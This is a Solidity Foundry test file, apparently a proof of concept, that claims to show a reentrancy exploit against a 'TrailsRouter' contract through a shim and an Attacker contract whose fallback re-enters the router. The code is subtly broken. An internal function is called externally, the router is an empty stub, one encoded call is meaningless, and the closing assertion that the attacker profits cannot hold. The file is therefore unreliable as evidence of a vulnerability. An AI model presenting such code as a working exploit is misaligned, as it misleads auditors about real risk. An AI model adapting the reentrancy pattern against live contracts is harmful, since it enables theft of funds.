// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITrailsRouter {
    function _injectAndExecuteCall(bytes memory callData) external payable;
}

contract TrailsRouterShim {
    address public ROUTER;

    constructor(address _router) {
        ROUTER = _router;
    }

    function _forwardToRouter(bytes memory forwardData, uint256 callValue) internal returns (bytes memory) {
        (bool success, bytes memory ret) = ROUTER.call{value: callValue}(forwardData);
        if (!success) {
            revert("RouterCallFailed");
        }
        return ret;
    }
}

contract ExploitTest is Test {
    TrailsRouterShim public trailsRouterShim;
    ITrailsRouter public trailsRouter;
    address public attacker;

    function setUp() public {
        // Deploy the TrailsRouter contract
        trailsRouter = ITrailsRouter(address(new TrailsRouter()));

        // Deploy the TrailsRouterShim contract with the TrailsRouter address
        trailsRouterShim = new TrailsRouterShim(address(trailsRouter));

        // Set up the attacker
        attacker = address(new Attacker(address(trailsRouterShim), address(trailsRouter)));
        vm.deal(attacker, 1 ether); // Fund the attacker with 1 ether
    }

    function test_exploit() public {
        // Step 1: Attacker calls _forwardToRouter with crafted data
        bytes memory craftedData = abi.encodeWithSignature("_injectAndExecuteCall(bytes)", "maliciousData");
        vm.prank(attacker);
        trailsRouterShim._forwardToRouter(craftedData, 1 ether);

        // Assert the vulnerability
        // Check if the attacker was able to extract more funds than entitled
        assertGt(attacker.balance, 1 ether);
    }
}

contract Attacker {
    TrailsRouterShim public trailsRouterShim;
    ITrailsRouter public trailsRouter;

    constructor(address _trailsRouterShim, address _trailsRouter) {
        trailsRouterShim = TrailsRouterShim(_trailsRouterShim);
        trailsRouter = ITrailsRouter(_trailsRouter);
    }

    fallback() external payable {
        // Re-enter the TrailsRouter contract during the external call
        trailsRouter._injectAndExecuteCall{value: msg.value}(abi.encodeWithSignature("maliciousData"));
    }

    function attack() external payable {
        // Trigger the reentrancy by calling _forwardToRouter
        trailsRouterShim._forwardToRouter(abi.encodeWithSignature("_injectAndExecuteCall(bytes)", "maliciousData"), msg.value);
    }
}

contract TrailsRouter is ITrailsRouter {
    function _injectAndExecuteCall(bytes memory callData) external payable override {
        // Simulate some logic that could be exploited
    }
}